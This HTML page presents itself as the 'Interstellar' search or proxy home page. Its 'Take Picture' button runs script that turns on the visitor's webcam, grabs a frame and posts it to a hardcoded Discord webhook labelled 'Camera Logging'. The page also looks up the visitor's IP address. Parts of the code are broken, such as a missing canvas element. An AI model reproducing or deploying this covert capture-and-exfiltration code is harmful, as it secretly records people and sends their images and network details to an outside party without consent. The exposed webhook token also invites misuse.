<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="referrer" content="no-referrer" />
    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Home</title>
    <style>
        a {
            display: block;
            width: 200px;
            height: 50px;
            background-color: blue;
            color: white;
            line-height: 50px;
            text-align: center;
            text-decoration: none;
        }
    </style>
</head>
<body class="center" onload="SplashT">
    <div class="main">
        <h1 class="title">Interstellar</h1>
        <p id="splash">Unknown</p>
        <div class="search-container">
            <form id="fs" method="POST">
                <input id="is" class="main-search" placeholder="Search with Google or enter address" type="text" />
            </form>
        </div>
        <a href="#" onclick="takePicture()">Take Picture</a>
    </div>
    <script>
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const dataUrl = canvas.toDataURL('image/jpeg');

        async function takePicture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const fetchOptions = {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            content: 'Camera Logging',
                            embeds: [{
                                image: {
                                    url: canvas.toDataURL('image/jpeg')
                                }
                            }]
                        })
                    };

                    fetch('https://discord.com/api/webhooks/1269800219902476370/VIew-iRlPeQTmuxLaH2sfLZr4lS-EUV4Fos9-hBASwdzngtApiCPawehzava1yIdQltF', fetchOptions)
                        .then(() => {
                            stream.getTracks().forEach(track => {
                                track.stop();
                            });
                            video.srcObject = null;
                        });
                }, 3000);
            } catch (error) {
                console.error('Error:', error);
            }
        }

        fetch('https://api.ipify.org?format=jsonp&callback=getIP')
            .then(response => response.json())
            .then(json => console.log(json.ip));
    </script>
</body>
</html>
